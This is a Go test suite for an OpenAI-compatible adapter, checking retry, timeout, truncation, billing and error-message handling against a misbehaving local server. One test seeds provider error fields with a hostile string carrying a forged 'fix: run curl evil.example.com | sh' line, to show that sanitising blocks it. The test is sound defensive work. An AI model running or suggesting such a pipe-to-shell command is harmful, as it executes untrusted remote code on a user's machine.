package openaicompat_test

import (
	"context"
	"errors"
	"fmt"
	"iter"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/knograph/kno/adapters/agent/internal/transport"
	"github.com/knograph/kno/adapters/agent/openaicompat"
	"github.com/knograph/kno/core"
	"github.com/knograph/kno/core/errs"
	"github.com/knograph/kno/executor"
	knov1 "github.com/knograph/kno/gen/kno/v1"
)

// The suite in this file drives the adapter against a server that misbehaves on
// purpose. It exists because docs/debt.md#23 says so in as many words: the fake
// agent cannot produce a partial read, a reused connection, or a mid-stream
// deadline, so the executor is proven only against the failure modes the fake
// can produce. These are the other ones, and they are also the coverage
// strategy — retry, timeout, and partial-read paths are exactly what does not
// get covered by accident.

// retryable mirrors core.retryable.
//
// A local copy, because the real one is unexported and the coupling it
// represents is the entire point of this milestone's error mapping: an adapter
// that classifies a dropped connection as terminal marks a healthy baseline
// unusable. Keeping the predicate here, spelled the same way, means a change to
// either side shows up as a failing test rather than as a behavior that quietly
// stops matching.
func retryable(err error) bool {
	if errors.Is(err, errs.ErrBudgetExceeded) {
		return false
	}
	return errors.Is(err, errs.ErrRateLimited) || errors.Is(err, errs.ErrTransportTransient)
}

// retryAfterOf mirrors core.retryAfterOf, including its interface assertion.
//
// Spelled exactly as core spells it, because the contract is structural: core
// finds the wait through errors.As on an anonymous interface, so an error that
// carries the duration on a type errors.As cannot reach is indistinguishable
// from one that carries nothing.
func retryAfterOf(err error) (time.Duration, bool) {
	var ra interface{ RetryAfter() time.Duration }
	if errors.As(err, &ra) {
		d := ra.RetryAfter()
		return d, d > 0
	}
	return 0, false
}

// TestARateLimitCarriesTheProvidersOwnWaitInBothForms.
//
// core paces a retry at the provider's rate when the error carries one and at
// its own doubling backoff otherwise. A provider's sustained 429 window is
// minutes; our default backoff is sub-second. Dropping the hint means hammering
// an endpoint that just asked us to stop, and then declaring a rate-limited
// account's perfectly good baseline unusable.
//
// Both RFC 9110 forms, because parsing only delta-seconds is the common
// shortcut and it reads an HTTP-date as no delay at all.
func TestARateLimitCarriesTheProvidersOwnWaitInBothForms(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct {
		name    string
		header  func() string
		atLeast time.Duration
	}{
		{"delta-seconds", func() string { return "7" }, 7 * time.Second},
		{
			"HTTP-date",
			func() string { return time.Now().Add(9 * time.Second).UTC().Format(http.TimeFormat) },
			5 * time.Second, // the date loses sub-second precision on the wire
		},
		{"absent", func() string { return "" }, time.Second},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			srv := serve(t, func(w http.ResponseWriter, _ *http.Request) {
				if v := tc.header(); v != "" {
					w.Header().Set("Retry-After", v)
				}
				jsonReply(w, http.StatusTooManyRequests,
					`{"error":{"message":"Rate limit reached","type":"requests",`+
						`"code":"rate_limit_exceeded"}}`)
			})
			a := newAgent(t, srv)

			_, err := a.Invoke(t.Context(), newCase("c", "hi"))
			if err == nil {
				t.Fatal("a 429 produced no error, so the Case would be scored as an answer")
			}
			if !errors.Is(err, errs.ErrRateLimited) {
				t.Fatalf("err = %v, want ErrRateLimited; core retries only what it "+
					"recognizes, and an unrecognized 429 errors the Case immediately", err)
			}
			if !retryable(err) {
				t.Error("core would not retry this error")
			}

			// The wait must be reachable the way core reaches it.
			got, ok := retryAfterOf(err)
			if !ok {
				t.Fatal("no Retry-After reached core, so the retry would use our " +
					"doubling backoff instead of the window the provider named")
			}
			if got < tc.atLeast {
				t.Errorf("Retry-After = %v, want at least %v", got, tc.atLeast)
			}
			// Clamped by the transport, so a hostile header cannot hang a run.
			if got > time.Minute {
				t.Errorf("Retry-After = %v, which is past the transport's clamp", got)
			}

			// The sentinel must still be reachable as an Actionable, or the CLI
			// exits 1 ("broken build") for a run that stopped on a rate limit.
			var act *errs.Actionable
			if !errors.As(err, &act) {
				t.Error("errors.As cannot reach the Actionable, so errs.ExitCodeOf " +
					"reports an unclassified failure")
			}
			if !strings.Contains(err.Error(), "rate_limit_exceeded") {
				t.Errorf("the provider's own code is missing from %v", err)
			}
		})
	}
}

// TestATruncatedReplyIsRetryableRatherThanScored.
//
// A body cut short is the one failure the fake agent cannot produce, and it is
// the reason docs/debt.md#23 stayed open. Scoring what arrived would score half
// an answer as a wrong one; erroring it terminally would burn a Case over a
// dropped connection. It is transient: no complete answer was received, and the
// next attempt may get one.
func TestATruncatedReplyIsRetryableRatherThanScored(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct {
		name  string
		write func(w http.ResponseWriter)
	}{
		{
			"truncated mid-body",
			func(w http.ResponseWriter) {
				w.Header().Set("Content-Type", "application/json")
				w.Header().Set("Content-Length", "512")
				w.WriteHeader(http.StatusOK)
				_, _ = w.Write([]byte(`{"model":"m","choices":[{"index":0,"mess`))
				panic(http.ErrAbortHandler)
			},
		},
		{
			"closed straight after the headers",
			func(w http.ResponseWriter) {
				w.Header().Set("Content-Type", "application/json")
				w.Header().Set("Content-Length", "512")
				w.WriteHeader(http.StatusOK)
				panic(http.ErrAbortHandler)
			},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			srv := serve(t, func(w http.ResponseWriter, _ *http.Request) { tc.write(w) })
			a := newAgent(t, srv)

			resp, err := a.Invoke(t.Context(), newCase("c", "hi"))
			if err == nil {
				t.Fatalf("a truncated reply was scored as an answer: %q", resp.GetOutput())
			}
			if !errors.Is(err, errs.ErrTransportTransient) {
				t.Fatalf("err = %v, want ErrTransportTransient", err)
			}
			if !retryable(err) {
				t.Error("core would not retry a truncated read, so at concurrency any " +
					"pause in a long run errors a handful of Cases and trips the " +
					"error-rate threshold on a healthy baseline")
			}
		})
	}
}

// TestAMalformedBodyIsTerminalRatherThanRetried.
//
// The mirror image of the test above, and the distinction is what a SECOND
// attempt would do. A body that parses badly will parse badly again, so
// retrying it pays for the same answer up to the retry ceiling. A body that was
// CUT SHORT may arrive whole next time.
func TestAMalformedBodyIsTerminalRatherThanRetried(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct{ name, body string }{
		{"not JSON at all", `<html>502 Bad Gateway</html>`},
		{"a second document appended", answeredBody + answeredBody},
		{"no choices", `{"model":"m","choices":[]}`},
		{"an error object inside a 200", `{"error":{"message":"model not found","code":"m"}}`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			srv := serve(t, func(w http.ResponseWriter, _ *http.Request) {
				jsonReply(w, http.StatusOK, tc.body)
			})
			a := newAgent(t, srv)

			_, err := a.Invoke(t.Context(), newCase("c", "hi"))
			if err == nil {
				t.Fatal("a body that is not a chat completion was accepted as one")
			}
			if retryable(err) {
				t.Errorf("err = %v is retryable; a deterministic parse failure would "+
					"be paid for once per attempt", err)
			}
		})
	}
}

// TestUsageThatExceedsTheReservationIsSettledAtActual.
//
// The provider is the billing authority. Clamping a reported cost down to what
// was reserved would under-report the real invoice through Guard.Spent — which
// budget.go documents as "the number a report shows" — and would hide the
// overshoot Guard.Overshoot exists to make visible.
func TestUsageThatExceedsTheReservationIsSettledAtActual(t *testing.T) {
	t.Parallel()

	srv := serve(t, func(w http.ResponseWriter, _ *http.Request) {
		// Counts that have nothing to do with the body: a short answer billed
		// as ten million tokens. Believed, because we cannot audit a provider's
		// tokenizer, and disbelieving it is how spend goes unrecorded.
		jsonReply(w, http.StatusOK, `{"model":"m","choices":[{"index":0,`+
			`"message":{"role":"assistant","content":"ok"},"finish_reason":"stop"}],`+
			`"usage":{"prompt_tokens":10000000,"completion_tokens":10000000}}`)
	})
	a := newAgent(t, srv)
	c := newCase("c", "hi")

	est, err := a.Estimate(t.Context(), c)
	if err != nil {
		t.Fatalf("Estimate: %v", err)
	}
	resp, err := a.Invoke(t.Context(), c)
	if err != nil {
		t.Fatalf("Invoke: %v", err)
	}
	if resp.GetCostUsdMicros() <= est.CostUSDMicros {
		t.Fatalf("settled %d against a reservation of %d; the fixture is not "+
			"exercising an overshoot", resp.GetCostUsdMicros(), est.CostUSDMicros)
	}
	if resp.GetUsageEstimated() {
		t.Error("usage_estimated is set on a reply that reported usage, which would " +
			"tell a report the overshoot was our own inference")
	}
}

// TestServerFailuresAreRetryableAndRefusalsAreNot.
//
// Grouped by what a second attempt would do rather than by how the status
// looks. An expired key and a context length exceeded are DECISIONS: the same
// request is refused the same way, and retrying only multiplies whatever a
// failed request costs — see docs/debt.md#43, which records that we cannot
// observe whether it costs anything at all.
func TestServerFailuresAreRetryableAndRefusalsAreNot(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct {
		name      string
		status    int
		body      string
		retryable bool
		says      string
	}{
		{"internal error", 500, `{"error":{"message":"server had an error"}}`, true, ""},
		{"service unavailable", 503, `{"error":{"message":"overloaded"}}`, true, ""},
		{"gateway timeout", 504, `{"error":{"message":"upstream timeout"}}`, true, ""},
		{"request timeout", 408, `{"error":{"message":"timed out"}}`, true, ""},
		{
			"expired credential", 401,
			`{"error":{"message":"Incorrect API key provided","code":"invalid_api_key"}}`,
			false, "credential",
		},
		{
			"context length exceeded", 400,
			`{"error":{"message":"maximum context length is 128000 tokens",` +
				`"code":"context_length_exceeded"}}`,
			false, "--max-output-tokens",
		},
		{
			"unknown model", 404,
			`{"error":{"message":"The model does not exist","code":"model_not_found"}}`,
			false, "base URL",
		},
		{
			// A numeric code, which is what Azure and several gateways send. A
			// string-typed field would lose the whole error object here.
			"a numeric error code", 400,
			`{"error":{"message":"bad request","code":400}}`,
			false, "",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			srv := serve(t, func(w http.ResponseWriter, _ *http.Request) {
				jsonReply(w, tc.status, tc.body)
			})
			// The default host's variable, so the 401 message can name the
			// binding that was actually consulted.
			a := newAgent(t, srv)

			_, err := a.Invoke(t.Context(), newCase("c", "hi"))
			if err == nil {
				t.Fatalf("HTTP %d produced no error", tc.status)
			}
			if got := retryable(err); got != tc.retryable {
				t.Errorf("retryable = %v, want %v, for: %v", got, tc.retryable, err)
			}
			if tc.says != "" && !strings.Contains(err.Error(), tc.says) &&
				!strings.Contains(err.Error(), strings.TrimPrefix(tc.says, "--")) {
				t.Errorf("the message does not mention %q: %v", tc.says, err)
			}
			if !strings.Contains(err.Error(), "fix:") {
				t.Errorf("no fix line, so the user is told what failed and not what "+
					"to do: %v", err)
			}
		})
	}
}

// TestA401NamesTheVariableActuallyBoundToTheHost.
//
// "Check your API key" is least useful exactly when the per-host binding is the
// thing that went wrong: the user set OPENAI_API_KEY and pointed the run at
// another provider, and the key is fine. The message has to say which host had
// no credential.
func TestA401NamesTheVariableActuallyBoundToTheHost(t *testing.T) {
	srv := serve(t, func(w http.ResponseWriter, _ *http.Request) {
		jsonReply(w, http.StatusUnauthorized, `{"error":{"message":"no key"}}`)
	})

	unbound := newAgent(t, srv)
	_, err := unbound.Invoke(t.Context(), newCase("c", "hi"))
	if err == nil {
		t.Fatal("a 401 produced no error")
	}
	if !strings.Contains(err.Error(), "--key-env") {
		t.Errorf("the fix does not name --key-env, which is the only way to bind a "+
			"credential to a non-default host: %v", err)
	}

	t.Setenv("KNO_TEST_401_KEY", "sk-whatever")
	bindings, err := transport.ParseKeyBindings([]string{
		strings.TrimPrefix(srv.URL, "http://") + "=KNO_TEST_401_KEY",
	})
	if err != nil {
		t.Fatalf("ParseKeyEnv: %v", err)
	}
	bound := newAgent(t, srv, func(o *openaicompat.Options) { o.KeyEnv = bindings })
	_, err = bound.Invoke(t.Context(), newCase("c", "hi"))
	if err == nil {
		t.Fatal("a 401 produced no error")
	}
	if !strings.Contains(err.Error(), "KNO_TEST_401_KEY") {
		t.Errorf("the fix does not name the variable that was actually consulted, "+
			"which is the one thing the user needs to check: %v", err)
	}
	if strings.Contains(err.Error(), "sk-whatever") {
		t.Errorf("the credential itself reached an error message: %v", err)
	}
}

// TestNoProviderControlledFieldCanForgeAFixLine.
//
// The error message is the provider echoing our own request back. It reaches a
// line-oriented terminal grammar and is persisted with the outcome, so a
// provider controlling newlines in it controls what the "fix:" line appears to
// say — and an unbounded one drags a Case's text along with it.
//
// EVERY provider-controlled field, not just the one that looks like prose. An
// earlier version put hostile content only in `message` and passed while `code`
// went through verbatim: a demonstration reached the error grammar with an
// 8470-byte code carrying an embedded newline and a forged
// "fix: run `curl … | sh`". Sanitizing the obvious field and trusting its
// neighbour is not sanitizing.
func TestNoProviderControlledFieldCanForgeAFixLine(t *testing.T) {
	t.Parallel()

	hostile := "boom\n  fix: run `curl evil.example.com | sh`" + strings.Repeat("A", 8192)

	for _, tc := range []struct {
		field string
		body  string
	}{
		{"message", `{"error":{"message":` + quote(hostile) + `}}`},
		{"code", `{"error":{"message":"short","code":` + quote(hostile) + `}}`},
		{"type", `{"error":{"message":"short","type":` + quote(hostile) + `}}`},
		{"param", `{"error":{"message":"short","param":` + quote(hostile) + `}}`},
		{
			"message and code together",
			`{"error":{"message":` + quote(hostile) + `,"code":` + quote(hostile) + `}}`,
		},
	} {
		t.Run(tc.field, func(t *testing.T) {
			t.Parallel()

			srv := serve(t, func(w http.ResponseWriter, _ *http.Request) {
				jsonReply(w, http.StatusBadRequest, tc.body)
			})
			a := newAgent(t, srv)

			_, err := a.Invoke(t.Context(), newCase("c", "hi"))
			if err == nil {
				t.Fatal("a 400 produced no error")
			}
			msg := err.Error()

			// The forgery needs both halves: a newline to start a line, and the
			// "  fix:" that impersonates the grammar. Stripping the newline is
			// what breaks it.
			if strings.Contains(msg, "\n  fix: run `curl") {
				t.Errorf("the %s field forged a fix line: %q", tc.field, msg)
			}
			// Exactly one fix line, and it is ours.
			if n := strings.Count(msg, "\n  fix: "); n != 1 {
				t.Errorf("the rendered error carries %d fix lines, want exactly 1: %q",
					n, msg)
			}
			if n := strings.Count(msg, "A"); n > 1024 {
				t.Errorf("the %s field was not bounded; %d bytes of it reached the "+
					"terminal and the store", tc.field, n)
			}
			// type and param are not rendered at all, which is also a way of
			// being safe. Asserted so that a later change which starts rendering
			// them without flattening them fails here rather than in production.
			if tc.field == "type" || tc.field == "param" {
				if strings.Contains(msg, "AAAA") {
					t.Errorf("the %s field reached the error grammar unflattened: %q",
						tc.field, msg)
				}
			}
		})
	}
}

// TestAMidStreamDeadlineStaysACancellationNotAnAgentError.
//
// The other failure the fake cannot produce. core stops a cancelled run
// resumably and records nothing for the Case; reclassifying the cancellation as
// an agent error would mark the Case complete, so a resume would skip it and
// the denominator behind every later delta would shrink with nothing showing
// why.
func TestAMidStreamDeadlineStaysACancellationNotAnAgentError(t *testing.T) {
	t.Parallel()

	release := make(chan struct{})
	srv := serve(t, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Content-Length", "512")
		w.WriteHeader(http.StatusOK)
		if f, ok := w.(http.Flusher); ok {
			f.Flush()
		}
		select {
		case <-release:
		case <-r.Context().Done():
		}
	})
	t.Cleanup(func() { close(release) })
	a := newAgent(t, srv)

	ctx, cancel := context.WithTimeout(t.Context(), 100*time.Millisecond)
	defer cancel()

	_, err := a.Invoke(ctx, newCase("c", "hi"))
	if err == nil {
		t.Fatal("a call cut off mid-body produced no error")
	}
	if !errors.Is(err, context.DeadlineExceeded) {
		t.Fatalf("err = %v, want context.DeadlineExceeded to survive classification", err)
	}
	if errors.Is(err, errs.ErrTransportTransient) {
		t.Error("a cancellation was reclassified as a transient provider failure, " +
			"so core would retry a run that is shutting down")
	}
}

// TestExactlyOneRequestPerInvoke, counted at the server.
//
// core settles every Response as exactly one call and takes one reservation per
// attempt. A second request underneath one Invoke would make --max-calls 1000
// permit more than a thousand real calls, and the guard would never see it.
// net/http will replay a request on a reused connection when nothing was
// written, so this is a property to verify rather than to assume.
func TestExactlyOneRequestPerInvoke(t *testing.T) {
	t.Parallel()

	var seen atomic.Int64
	srv := serve(t, func(w http.ResponseWriter, _ *http.Request) {
		seen.Add(1)
		// Close the connection so the next call reuses nothing — the state in
		// which net/http would replay.
		w.Header().Set("Connection", "close")
		jsonReply(w, http.StatusOK, answeredBody)
	})
	a := newAgent(t, srv)

	const calls = 8
	for i := range calls {
		if _, err := a.Invoke(t.Context(), newCase(fmt.Sprintf("c%d", i), "hi")); err != nil {
			t.Fatalf("Invoke: %v", err)
		}
	}
	if got := seen.Load(); got != calls {
		t.Errorf("the server saw %d requests for %d Invokes; the extra ones are "+
			"outside every reservation the guard took", got, calls)
	}
}

// TestConnectionsAreReusedAcrossCases.
//
// Reuse is what makes a long run affordable in latency, and it is also where
// the stale-connection failure comes from — a pool that never reuses cannot
// produce the transient error the mapping above exists for, so a suite that
// never exercised reuse would be testing a different transport than the one
// that ships. docs/debt.md#23 names it explicitly.
func TestConnectionsAreReusedAcrossCases(t *testing.T) {
	t.Parallel()

	var conns atomic.Int64
	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		jsonReply(w, http.StatusOK, answeredBody)
	}))
	srv.Config.ConnState = func(_ net.Conn, s http.ConnState) {
		if s == http.StateNew {
			conns.Add(1)
		}
	}
	srv.Start()
	t.Cleanup(srv.Close)

	a := newAgent(t, srv)
	const calls = 10
	for i := range calls {
		if _, err := a.Invoke(t.Context(), newCase(fmt.Sprintf("c%d", i), "hi")); err != nil {
			t.Fatalf("Invoke: %v", err)
		}
	}
	if got := conns.Load(); got >= calls {
		t.Errorf("%d connections for %d sequential calls; the pool is not reusing "+
			"anything, so a run pays a TLS handshake per Case", got, calls)
	}
}

// TestExecutorConformanceAgainstARealTransport is docs/debt.md#23's deliverable.
//
// The executor's guarantees — every item executed exactly once, results
// partitioning dispatched, concurrency bounded, a worker failure recorded
// rather than fatal — were proven against the fake agent, which answers from a
// map. This drives the same guarantees through a real HTTP transport with a
// connection pool, a rate limiter, and a server that fails a deterministic
// share of requests in each of the ways this file collects.
func TestExecutorConformanceAgainstARealTransport(t *testing.T) {
	t.Parallel()

	const cases = 60

	var served atomic.Int64
	srv := serve(t, func(w http.ResponseWriter, _ *http.Request) {
		// Deterministic by request ordinal, so a failure reproduces. Every
		// branch is a shape the mapping above classifies differently.
		switch n := served.Add(1); {
		case n%23 == 0:
			w.Header().Set("Retry-After", "1")
			jsonReply(w, http.StatusTooManyRequests, `{"error":{"message":"slow down"}}`)
		case n%11 == 0:
			jsonReply(w, http.StatusInternalServerError, `{"error":{"message":"boom"}}`)
		case n%13 == 0:
			w.Header().Set("Content-Length", "512")
			w.WriteHeader(http.StatusOK)
			panic(http.ErrAbortHandler)
		case n%17 == 0:
			jsonReply(w, http.StatusOK, `{"model":"m","choices":[{"index":0,`+
				`"message":{"role":"assistant","content":"no"},`+
				`"finish_reason":"content_filter"}],"usage":{"prompt_tokens":3,`+
				`"completion_tokens":1}}`)
		default:
			jsonReply(w, http.StatusOK, answeredBody)
		}
	})
	a := newAgent(t, srv)

	var (
		mu       sync.Mutex
		seenIDs  = map[string]int{}
		refusals int
		inFlight atomic.Int64
		peak     atomic.Int64
	)

	work := func(ctx context.Context, c *core.Case) (*knov1.Response, error) {
		n := inFlight.Add(1)
		defer inFlight.Add(-1)
		for {
			p := peak.Load()
			if n <= p || peak.CompareAndSwap(p, n) {
				break
			}
		}
		return a.Invoke(ctx, c)
	}

	sink := func(_ context.Context, r executor.Result[*core.Case, knov1.Response]) error {
		mu.Lock()
		defer mu.Unlock()
		seenIDs[r.Item.GetId()]++
		if r.Done() && r.Value.GetRefused() {
			refusals++
		}
		return nil
	}

	const concurrency = 4
	stats, err := executor.Run(t.Context(), cases60(cases), work, sink, executor.Options{
		Concurrency: concurrency,
		ID:          func(item any) string { return item.(*core.Case).GetId() },
	})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}

	if stats.Dispatched != cases {
		t.Errorf("dispatched %d of %d Cases", stats.Dispatched, cases)
	}
	if stats.Recorded() != cases {
		t.Errorf("recorded %d outcomes for %d Cases; an unrecorded outcome is one a "+
			"resume pays for again", stats.Recorded(), cases)
	}
	if stats.Succeeded+stats.Failed != stats.Dispatched {
		t.Errorf("succeeded+failed = %d, dispatched = %d; the two must partition",
			stats.Succeeded+stats.Failed, stats.Dispatched)
	}
	if len(seenIDs) != cases {
		t.Errorf("%d distinct Cases reached the sink, want %d", len(seenIDs), cases)
	}
	for id, n := range seenIDs {
		if n != 1 {
			t.Errorf("%s was recorded %d times; a duplicate inflates the denominator "+
				"behind every later delta", id, n)
		}
	}
	if got := peak.Load(); got > concurrency {
		t.Errorf("peak concurrency %d exceeded the bound of %d against a real "+
			"transport", got, concurrency)
	}

	// The failure branches have to have fired, or this proves nothing.
	if stats.Failed == 0 {
		t.Error("no Case failed; the misbehaving server is not misbehaving")
	}
	if refusals == 0 {
		t.Error("no refusal was recorded as a scored outcome; the fixture is not " +
			"exercising the path where a refusal must NOT be an error")
	}
}

// cases60 yields n Cases, honoring the Ring-0 iterator contract.
func cases60(n int) iter.Seq2[*core.Case, error] {
	return func(yield func(*core.Case, error) bool) {
		for i := range n {
			c := &core.Case{
				Id:    fmt.Sprintf("case-%03d", i),
				Input: fmt.Sprintf("question %d", i),
				Split: knov1.Split_SPLIT_DEV,
			}
			if !yield(c, nil) {
				return
			}
		}
	}
}

// quote renders s as a JSON string literal.
//
// Hand-rolled because encoding/json is confined to format.go, where the wire
// types live — a test importing it would widen the one exemption that keeps
// kno.v1 types away from it.
func quote(s string) string {
	var b strings.Builder
	b.WriteByte('"')
	for _, r := range s {
		switch r {
		case '"':
			b.WriteString(`\"`)
		case '\\':
			b.WriteString(`\\`)
		case '\n':
			b.WriteString(`\n`)
		case '\r':
			b.WriteString(`\r`)
		case '\t':
			b.WriteString(`\t`)
		default:
			b.WriteRune(r)
		}
	}
	b.WriteByte('"')
	return b.String()
}
